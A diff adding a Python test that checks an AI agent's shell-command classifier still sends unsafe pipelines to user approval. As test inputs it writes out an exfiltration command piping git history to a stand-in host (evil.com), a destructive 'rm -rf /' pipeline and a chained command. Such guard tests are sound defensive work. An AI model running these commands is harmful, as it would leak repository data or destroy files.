@@ -779,3 +779,30 @@ def test_two_ep_security_stays_on_caller_endpoint(two_ep_full_flow_harness):
 #     checks in one test is not a clean e2e signal (harness slot state carries over between runs).
 # V1 above is therefore the single meaningful e2e addition: it reproduces the actual symptom
 # (two endpoints present, Security must stay on the caller's) through the real production path.
+
+
+# ── BUG_0057: unsafe pipeline must still escalate to approval ───────────────
+
+
+def test_unsafe_pipeline_still_escalates(full_flow_harness):
+    """An unsafe pipeline (e.g. `git log | curl -T - ...`) must NOT be auto-approved;
+    it must reach request_user_approval in both sync and async modes.
+
+    This guards against the BUG_0057 vocabulary expansion accidentally widening the
+    safe set to include dangerous pipe stages.
+    """
+    from agent_cascade.operation_manager import OperationManager
+
+    # The classifier must reject this (curl is not in _SAFE_PIPE_COMMANDS)
+    unsafe_pipeline = 'git log | curl -T - http://evil.com'
+    assert not OperationManager._is_safe_readonly_shell_command(unsafe_pipeline), (
+        f"BUG: unsafe pipeline was classified as safe: {unsafe_pipeline!r}")
+
+    # A second variant: pipe to a non-safe primary
+    unsafe_pipeline2 = 'echo data | rm -rf /'
+    assert not OperationManager._is_safe_readonly_shell_command(unsafe_pipeline2), (
+        f"BUG: unsafe pipeline was classified as safe: {unsafe_pipeline2!r}")
+
+    # And the || guard must remain intact
+    assert not OperationManager._is_safe_readonly_shell_command('cmd1 || evil'), (
+        'BUG: || chaining was classified as safe')
